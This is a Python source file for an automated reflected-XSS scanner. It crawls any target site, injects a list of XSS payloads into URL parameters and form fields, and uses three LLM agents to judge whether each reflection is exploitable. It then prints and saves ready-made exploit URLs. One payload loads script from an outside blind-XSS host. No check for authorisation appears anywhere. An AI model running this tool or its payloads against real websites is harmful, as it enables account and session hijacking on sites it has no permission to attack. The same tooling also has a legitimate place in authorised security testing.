import os
import re
import requests
import urllib
import time
import sys
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from crewai import Agent, Crew, Process, Task, LLM

# =========================
# CONFIGURATION
# =========================
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Rate limiting settings
REQUEST_DELAY = 3  # seconds between requests
MAX_REQUESTS_PER_HOUR = 100  # maximum requests per hour
TIMEOUT = 10
MAX_PAGES = 50

# =========================
# GLOBAL TRACKERS
# =========================
visited = set()
found_vulns = []
request_count = 0
request_timestamps = []
start_time = datetime.now()

# =========================
# LLM CONFIG
# =========================
llm = LLM(
    model="gemini/gemini-3-flash-preview",
    api_key=os.getenv("GEMINI_API_KEY")
)

# =========================
# XSS PAYLOADS
# =========================
PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\" onfocus=alert(1) autofocus=\"",
    "javascript:alert(1)",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<scr<script>ipt>alert(1)</scr<script>ipt>",
    "{alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    "<script src=//xss.report/c/yourid></script>",
]

# =========================
# RATE LIMIT MANAGEMENT
# =========================
def check_quota():
    """
    Check remaining quota and apply delay
    """
    global request_count, request_timestamps
    
    # Apply 3-second delay
    time.sleep(REQUEST_DELAY)
    
    # Clean old timestamps (older than one hour)
    current_time = datetime.now()
    hour_ago = current_time.timestamp() - 3600
    request_timestamps = [ts for ts in request_timestamps if ts > hour_ago]
    
    # Check quota
    if len(request_timestamps) >= MAX_REQUESTS_PER_HOUR:
        print(f"\n[!] Quota exceeded ({MAX_REQUESTS_PER_HOUR} requests/hour)")
        print("[!] Wait one hour or change MAX_REQUESTS_PER_HOUR in settings")
        return False
    
    return True

def make_request(method, url, **kwargs):
    """
    Custom request function with quota control and delay
    """
    global request_count, request_timestamps
    
    # Check quota
    if not check_quota():
        return None
    
    try:
        if method.lower() == 'get':
            response = requests.get(url, headers=HEADERS, timeout=TIMEOUT, **kwargs)
        elif method.lower() == 'post':
            response = requests.post(url, headers=HEADERS, timeout=TIMEOUT, **kwargs)
        else:
            return None
        
        # Update counters
        request_count += 1
        request_timestamps.append(datetime.now().timestamp())
        
        # Show consumption status
        if request_count % 10 == 0:
            remaining = MAX_REQUESTS_PER_HOUR - len(request_timestamps)
            print(f"[📊] Total requests: {request_count} | Remaining: {remaining}")
        
        return response
        
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

# =========================
# CREW AI AGENTS
# =========================
xss_analyst = Agent(
    role="XSS Detection Analyst",
    goal="Identify potential XSS reflections in HTTP responses",
    backstory=(
        "You are an experienced web security analyst specializing in XSS detection. "
        "You excel at finding reflected payloads and understanding if they appear in dangerous contexts "
        "like script tags, attributes, or JavaScript contexts."
    ),
    llm=llm,
    verbose=False
)

xss_exploitation_specialist = Agent(
    role="XSS Exploitation Specialist",
    goal="Determine if the reflected XSS is actually exploitable",
    backstory=(
        "You are a senior penetration tester with deep knowledge of XSS exploitation techniques. "
        "You understand browser behaviors, CSP bypasses, and real-world exploitation scenarios. "
        "You evaluate if the reflection can lead to actual code execution considering context, "
        "encoding, filtering, and other security mechanisms."
    ),
    llm=llm,
    verbose=False
)

xss_risk_assessor = Agent(
    role="XSS Risk Assessor",
    goal="Evaluate the severity and real-world impact of detected XSS vulnerabilities",
    backstory=(
        "You are a security risk assessment expert who understands the business impact of vulnerabilities. "
        "You consider factors like attack complexity, required user interaction, context sensitivity, "
        "and potential damage to classify XSS vulnerabilities by severity (Critical/High/Medium/Low)."
    ),
    llm=llm,
    verbose=False
)

def llm_validate_xss(payload, response_text, url, vulnerable_param=None):
    """
    Enhanced validation using multiple agents for better accuracy
    """
    
    param_info = f"Vulnerable Parameter: {vulnerable_param}\n" if vulnerable_param else ""
    
    # Task 1: Initial Detection by XSS Analyst
    detection_task = Task(
        description=f"""
Analyze this potential XSS reflection:

URL: {url}
{param_info}Payload: {payload}

Response snippet (first 1500 chars):
{response_text[:1500]}

Analyze:
1. Is the payload reflected in the response?
2. What context is it reflected in? (HTML, JavaScript, Attribute, CSS, etc.)
3. Is there any encoding or filtering applied?
4. Is the reflection in a potentially dangerous location?
5. Which specific parameter is vulnerable?

Provide your analysis in this format:
REFLECTION: [YES/NO]
CONTEXT: [HTML/JS/ATTRIBUTE/CSS/OTHER]
ENCODING: [NONE/HTML/URL/OTHER]
VULNERABLE_PARAMETER: [parameter_name/NONE]
DANGER_POTENTIAL: [HIGH/MEDIUM/LOW]
""",
        agent=xss_analyst,
        expected_output="Structured analysis with the specified format"
    )
    
    # Task 2: Exploitation Assessment by Specialist
    exploitation_task = Task(
        description=f"""
Based on the analysis from the XSS Detection Analyst, evaluate exploitability:

Previous Analysis:
{{task_output}}

Additional Details:
- Payload: {payload}
- URL: {url}
- Vulnerable Parameter: {vulnerable_param if vulnerable_param else 'Not specified'}

Evaluate:
1. Can this reflection lead to JavaScript execution?
2. What conditions are needed for exploitation? (User interaction, specific browser, etc.)
3. Are there any bypasses needed? (CSP, Input filters, etc.)
4. Is this a real-world exploitable XSS?
5. How can the vulnerable parameter be exploited?

Provide your assessment in this format:
EXPLOITABLE: [YES/NO]
EXPLOITATION_COMPLEXITY: [LOW/MEDIUM/HIGH]
CONDITIONS: [NONE/USER_INTERACTION/SPECIFIC_BROWSER/OTHER]
BYPASS_REQUIRED: [YES/NO]
VULNERABLE_PARAMETER_CONFIRMED: [YES/NO]
""",
        agent=xss_exploitation_specialist,
        context=[detection_task],
        expected_output="Structured exploitation assessment"
    )
    
    # Task 3: Risk Assessment
    risk_task = Task(
        description=f"""
Based on both previous analyses, assess the risk:

Detection Analysis:
{{task1_output}}

Exploitation Assessment:
{{task2_output}}

Final Risk Assessment:
1. Severity Level (Critical/High/Medium/Low)
2. Real-world impact
3. Recommended priority for fixing
4. Confidence level in assessment
5. Specific parameter that needs fixing

Provide final assessment in this format:
SEVERITY: [CRITICAL/HIGH/MEDIUM/LOW]
IMPACT: [HIGH/MEDIUM/LOW]
PRIORITY: [IMMEDIATE/HIGH/MEDIUM/LOW]
CONFIDENCE: [HIGH/MEDIUM/LOW]
VULNERABLE_PARAMETER: [parameter_name]
FINAL_VERDICT: [VULNERABLE/SAFE/INCONCLUSIVE]
""",
        agent=xss_risk_assessor,
        context=[detection_task, exploitation_task],
        expected_output="Final risk assessment with verdict"
    )
    
    # Create and run the crew
    crew = Crew(
        agents=[xss_analyst, xss_exploitation_specialist, xss_risk_assessor],
        tasks=[detection_task, exploitation_task, risk_task],
        process=Process.sequential,
        verbose=False
    )
    
    try:
        result = crew.kickoff()
        result_text = str(result)
        
        # Parse the final verdict from the result
        if "FINAL_VERDICT: VULNERABLE" in result_text:
            # Extract severity information for reporting
            severity = "Medium"
            if "SEVERITY: CRITICAL" in result_text:
                severity = "Critical"
            elif "SEVERITY: HIGH" in result_text:
                severity = "High"
            elif "SEVERITY: LOW" in result_text:
                severity = "Low"
            
            # Extract confidence
            confidence = "Medium"
            if "CONFIDENCE: HIGH" in result_text:
                confidence = "High"
            elif "CONFIDENCE: LOW" in result_text:
                confidence = "Low"
            
            # Extract vulnerable parameter from result
            extracted_param = vulnerable_param
            if "VULNERABLE_PARAMETER: " in result_text:
                lines = result_text.split('\n')
                for line in lines:
                    if line.startswith("VULNERABLE_PARAMETER: "):
                        extracted_param = line.replace("VULNERABLE_PARAMETER: ", "").strip()
                        break
            
            return True, severity, confidence, extracted_param, result_text
        else:
            return False, None, None, None, result_text
            
    except Exception as e:
        print(f"[!] Error in LLM validation: {e}")
        return False, None, None, None, f"Error: {str(e)}"

# =========================
# HELPERS
# =========================
def is_same_domain(url, base):
    return urlparse(url).netloc == urlparse(base).netloc

def get_links(html, base_url):
    soup = BeautifulSoup(html, "lxml")
    links = set()

    for tag in soup.find_all("a", href=True):
        full = urljoin(base_url, tag["href"])
        if is_same_domain(full, base_url):
            links.add(full.split("#")[0])

    return links

def extract_forms(html, url):
    soup = BeautifulSoup(html, "lxml")
    forms = []

    for form in soup.find_all("form"):
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = []

        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if name:
                inputs.append(name)

        if inputs:
            forms.append({
                "action": urljoin(url, action) if action else url,
                "method": method,
                "inputs": inputs
            })

    return forms

def find_vulnerable_parameter_in_response(response_text, payload, all_params):
    """
    Find the vulnerable parameter in the response
    """
    # Search for payload in text
    payload_position = response_text.find(payload)
    if payload_position == -1:
        # Try searching for decoded payload
        decoded_payload = urllib.parse.unquote(payload)
        payload_position = response_text.find(decoded_payload)
        if payload_position == -1:
            return None
    
    # Search in the surrounding area
    start = max(0, payload_position - 200)
    end = min(len(response_text), payload_position + 200)
    context = response_text[start:end]
    
    # Search for parameter names in context
    for param in all_params:
        # Search for parameter in different forms
        patterns = [
            f'{param}="',  # param="value"
            f"{param}='",  # param='value'
            f'name="{param}"',  # name="param"
            f"name='{param}'",  # name='param'
            f'id="{param}"',  # id="param"
            f"id='{param}'",  # id='param'
        ]
        
        for pattern in patterns:
            if pattern in context:
                return param
    
    # Another attempt using regex for common HTML patterns
    html_patterns = [
        r'name="([^"]+)"[^>]*>' + re.escape(payload),
        r"name='([^']+)'[^>]*>" + re.escape(payload),
        r'id="([^"]+)"[^>]*>' + re.escape(payload),
        r"id='([^']+)'[^>]*>" + re.escape(payload),
        r'value="[^"]*' + re.escape(payload) + r'[^"]*"',
    ]
    
    for pattern in html_patterns:
        match = re.search(pattern, context, re.IGNORECASE)
        if match:
            return match.group(1) if match.group(1) else "Unknown"
    
    return None

# =========================
# XSS TESTING - ENHANCED WITH PARAMETER DETECTION
# =========================
def test_get_xss(url):
    """
    Test XSS with precise parameter detection
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return

    print(f"[*] Testing {len(params)} parameters in: {url}")
    
    # Test each parameter separately
    for param_name in params:
        print(f"  [>] Testing parameter: {param_name}")
        
        for payload in PAYLOADS:
            # Create parameters with payload in only one parameter
            test_params = {}
            for k in params:
                if k == param_name:
                    test_params[k] = payload
                else:
                    # Use original value for other parameters
                    test_params[k] = params[k][0] if params[k] else "test"
            
            query = urlencode(test_params, doseq=True)
            test_url = parsed._replace(query=query).geturl()

            try:
                # Use custom request function
                r = make_request('get', test_url)
                if not r:
                    continue
                
                # Search for payload in response
                if payload in r.text or urllib.parse.unquote(payload) in r.text:
                    print(f"    [+] Reflection detected in parameter '{param_name}'")
                    
                    # Try to identify vulnerable parameter from response
                    detected_param = find_vulnerable_parameter_in_response(r.text, payload, [param_name])
                    
                    # Enhanced validation with multiple agents
                    is_vuln, severity, confidence, confirmed_param, analysis = llm_validate_xss(
                        payload, r.text, test_url, detected_param or param_name
                    )
                    
                    if is_vuln:
                        # Use LLM-confirmed parameter if available
                        final_param = confirmed_param or detected_param or param_name
                        
                        found_vulns.append({
                            "type": f"Reflected XSS (GET) - {severity}",
                            "url": test_url,
                            "vulnerable_parameter": final_param,
                            "payload": payload,
                            "severity": severity,
                            "confidence": confidence,
                            "detection_method": "Parameter-specific testing",
                            "analysis": analysis[:500] + "..." if len(analysis) > 500 else analysis
                        })
                        print(f"    [🔥 XSS GET - {severity.upper()}] Parameter: {final_param}")
                        print(f"        Confidence: {confidence}")
                        print(f"        URL: {test_url}")
                    else:
                        print(f"    [✓] False positive: parameter '{param_name}'")
                        
            except Exception as e:
                print(f"    [!] Error testing {test_url}: {e}")

def test_form_xss(form):
    """
    Test XSS in forms with field detection
    """
    print(f"[*] Testing form with {len(form['inputs'])} fields: {form['action']}")
    
    # Test each field separately
    for input_name in form["inputs"]:
        print(f"  [>] Testing field: {input_name}")
        
        for payload in PAYLOADS:
            # Create data with payload in only one field
            data = {}
            for k in form["inputs"]:
                if k == input_name:
                    data[k] = payload
                else:
                    data[k] = "test"  # Default value for other fields

            try:
                if form["method"] == "post":
                    r = make_request('post', form["action"], data=data)
                else:
                    r = make_request('get', form["action"], params=data)
                
                if not r:
                    continue

                if payload in r.text or urllib.parse.unquote(payload) in r.text:
                    print(f"    [+] Reflection detected in field '{input_name}'")
                    
                    # Try to identify vulnerable field from response
                    detected_field = find_vulnerable_parameter_in_response(r.text, payload, [input_name])
                    
                    # Enhanced validation with multiple agents
                    is_vuln, severity, confidence, confirmed_field, analysis = llm_validate_xss(
                        payload, r.text, form['action'], detected_field or input_name
                    )
                    
                    if is_vuln:
                        # Use LLM-confirmed field if available
                        final_field = confirmed_field or detected_field or input_name
                        
                        found_vulns.append({
                            "type": f"Reflected XSS (FORM {form['method'].upper()}) - {severity}",
                            "url": form['action'],
                            "vulnerable_parameter": final_field,
                            "payload": payload,
                            "severity": severity,
                            "confidence": confidence,
                            "detection_method": "Form field testing",
                            "analysis": analysis[:500] + "..." if len(analysis) > 500 else analysis
                        })
                        print(f"    [🔥 XSS FORM - {severity.upper()}] Field: {final_field}")
                        print(f"        Confidence: {confidence}")
                        print(f"        URL: {form['action']}")
                    else:
                        print(f"    [✓] False positive: field '{input_name}'")
                    
            except Exception as e:
                print(f"    [!] Error testing form {form['action']}: {e}")

# =========================
# CRAWLER
# =========================
def crawl(start_url):
    queue = [start_url]

    while queue and len(visited) < MAX_PAGES:
        url = queue.pop(0)
        if url in visited:
            continue

        print(f"\n[+] Crawling: {url}")
        visited.add(url)

        try:
            # Use custom request function
            r = make_request('get', url)
            if not r:
                print(f"[!] Failed to fetch {url} (possibly quota exceeded)")
                continue
                
            html = r.text

            # Test GET parameters
            if "?" in url:
                test_get_xss(url)

            # Test Forms
            forms = extract_forms(html, url)
            for form in forms:
                test_form_xss(form)

            # Discover new links
            links = get_links(html, start_url)
            for link in links:
                if link not in visited and link not in queue:
                    queue.append(link)

        except Exception as e:
            print(f"[!] Error crawling {url}: {e}")

# =========================
# QUOTA MANAGEMENT FUNCTIONS
# =========================
def show_quota_status():
    """
    Show current quota status
    """
    global request_timestamps, request_count
    
    remaining = MAX_REQUESTS_PER_HOUR - len(request_timestamps)
    elapsed = datetime.now() - start_time
    
    print("\n" + "="*60)
    print("QUOTA STATUS")
    print("="*60)
    print(f"Total requests made: {request_count}")
    print(f"Requests in last hour: {len(request_timestamps)}")
    print(f"Remaining quota: {remaining}")
    print(f"Time elapsed: {elapsed}")
    print(f"Delay between requests: {REQUEST_DELAY} seconds")
    print("="*60)

def reset_quota():
    """
    Reset quota (for manual refresh)
    """
    global request_timestamps, request_count
    request_timestamps = []
    request_count = 0
    print("[✓] Quota reset successfully")

# =========================
# PARAMETER ANALYSIS FUNCTIONS
# =========================
def analyze_url_parameters(url):
    """
    Analyze URL parameters and display them
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    print(f"\n[*] Analyzing URL parameters: {url}")
    print("="*40)
    
    if not params:
        print("No parameters in this URL")
        return
    
    print(f"Found {len(params)} parameters:")
    for i, (param, values) in enumerate(params.items(), 1):
        print(f"  {i}. {param} = {values[0] if values else 'Empty'}")
    
    return params

def generate_exploit_urls(vulnerability):
    """
    Generate exploit URLs for discovered vulnerability
    """
    url = vulnerability["url"]
    param = vulnerability["vulnerable_parameter"]
    payload = vulnerability["payload"]
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    print(f"\n[*] Exploit URLs for parameter: {param}")
    print("-"*40)
    
    # URL with basic payload
    exploit_params = params.copy()
    exploit_params[param] = [payload]
    exploit_query = urlencode(exploit_params, doseq=True)
    exploit_url = parsed._replace(query=exploit_query).geturl()
    
    print(f"1. Basic exploit URL:")
    print(f"   {exploit_url}")
    
    # URL with URL encoding
    encoded_payload = urllib.parse.quote(payload)
    exploit_params[param] = [encoded_payload]
    exploit_query = urlencode(exploit_params, doseq=True)
    encoded_url = parsed._replace(query=exploit_query).geturl()
    
    print(f"\n2. URL with Encoding:")
    print(f"   {encoded_url}")
    
    # Return exploit URLs
    return {
        "basic_exploit": exploit_url,
        "encoded_exploit": encoded_url,
        "vulnerable_parameter": param,
        "payload": payload
    }

# =========================
# MAIN
# =========================
if __name__ == "__main__":
    print("=" * 60)
    print("Enhanced XSS Scanner with Parameter Detection")
    print("=" * 60)
    print(f"Config: {REQUEST_DELAY}s delay | {MAX_REQUESTS_PER_HOUR} req/hour")
    
    # Show quota management options
    print("\nOptions:")
    print("1. Start scan with default settings")
    print("2. Change quota settings")
    print("3. Reset quota counter")
    print("4. Analyze URL parameters")
    
    choice = input("\nSelect option (1-4): ").strip()
    
    if choice == "2":
        try:
            new_delay = float(input(f"Enter new delay in seconds (current: {REQUEST_DELAY}): ") or REQUEST_DELAY)
            new_quota = int(input(f"Enter new hourly quota (current: {MAX_REQUESTS_PER_HOUR}): ") or MAX_REQUESTS_PER_HOUR)
            REQUEST_DELAY = new_delay
            MAX_REQUESTS_PER_HOUR = new_quota
            print(f"[✓] Settings updated: {REQUEST_DELAY}s delay, {MAX_REQUESTS_PER_HOUR} req/hour")
        except ValueError:
            print("[!] Invalid input, using default settings")
    
    elif choice == "3":
        reset_quota()
    
    elif choice == "4":
        target = input("\nEnter URL to analyze parameters: ").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        analyze_url_parameters(target)
        exit()
    
    target = input("\nTarget URL (https://example.com): ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print(f"\nStarting scan on: {target}")
    print("Agents deployed: XSS Analyst, Exploitation Specialist, Risk Assessor")
    print("-" * 60)
    
    try:
        crawl(target)
    except KeyboardInterrupt:
        print("\n\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
    
    # Show final quota status
    show_quota_status()
    
    print("\n" + "=" * 60)
    print("XSS SCAN RESULTS")
    print("=" * 60)
    
    if not found_vulns:
        print("No exploitable XSS vulnerabilities found.")
    else:
        print(f"\nFound {len(found_vulns)} exploitable XSS vulnerabilities:\n")
        
        # Group by severity
        vulnerabilities_by_severity = {
            "Critical": [],
            "High": [],
            "Medium": [],
            "Low": []
        }
        
        for v in found_vulns:
            vulnerabilities_by_severity[v["severity"]].append(v)
        
        # Display by severity
        for severity in ["Critical", "High", "Medium", "Low"]:
            vulns = vulnerabilities_by_severity[severity]
            if vulns:
                print(f"\n{severity.upper()} Severity ({len(vulns)} found):")
                print("-" * 50)
                for v in vulns:
                    print(f"\n[{v['type']}]")
                    print(f"URL: {v['url']}")
                    print(f"Vulnerable Parameter: {v['vulnerable_parameter']}")
                    print(f"Payload: {v['payload']}")
                    print(f"Severity: {v['severity']}")
                    print(f"Confidence: {v['confidence']}")
                    print(f"Detection Method: {v.get('detection_method', 'Unknown')}")
                    print(f"Brief Analysis: {v['analysis'][:200]}...")
                    
                    # Generate exploit URLs
                    exploits = generate_exploit_urls(v)
        
        # Summary
        print("\n" + "=" * 60)
        print("SUMMARY")
        print("=" * 60)
        
        # Parameter statistics
        all_params = [v["vulnerable_parameter"] for v in found_vulns]
        unique_params = set(all_params)
        
        print(f"Total Vulnerabilities: {len(found_vulns)}")
        print(f"Unique Vulnerable Parameters: {len(unique_params)}")
        
        # Show most common vulnerable parameters
        if unique_params:
            print("\nVulnerable Parameters:")
            param_counts = {}
            for param in all_params:
                param_counts[param] = param_counts.get(param, 0) + 1
            
            for param, count in sorted(param_counts.items(), key=lambda x: x[1], reverse=True):
                print(f"  {param}: {count} vulnerabilities")
        
        # Statistics by severity
        print("\nVulnerabilities by Severity:")
        for severity in ["Critical", "High", "Medium", "Low"]:
            count = len(vulnerabilities_by_severity[severity])
            if count > 0:
                print(f"  {severity}: {count} vulnerabilities")
        
        # Save results to file
        output_file = f"xss_scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(output_file, "w", encoding="utf-8") as f:
            f.write("XSS Scan Results\n")
            f.write("=" * 60 + "\n")
            f.write(f"Target: {target}\n")
            f.write(f"Scan started: {start_time}\n")
            f.write(f"Total requests: {request_count}\n")
            f.write(f"Total vulnerabilities: {len(found_vulns)}\n")
            f.write(f"Vulnerable parameters: {', '.join(unique_params)}\n\n")
            
            for v in found_vulns:
                f.write(f"Type: {v['type']}\n")
                f.write(f"URL: {v['url']}\n")
                f.write(f"Vulnerable Parameter: {v['vulnerable_parameter']}\n")
                f.write(f"Payload: {v['payload']}\n")
                f.write(f"Severity: {v['severity']}\n")
                f.write(f"Confidence: {v['confidence']}\n")
                f.write(f"Detection Method: {v.get('detection_method', 'Unknown')}\n")
                f.write(f"Analysis:\n{v['analysis']}\n")
                
                # Add exploit URLs
                exploits = generate_exploit_urls(v)
                f.write(f"\nExploit URLs:\n")
                f.write(f"  Basic: {exploits['basic_exploit']}\n")
                f.write(f"  Encoded: {exploits['encoded_exploit']}\n")
                
                f.write("-" * 50 + "\n")
        
        print(f"\nDetailed results saved to: {output_file}")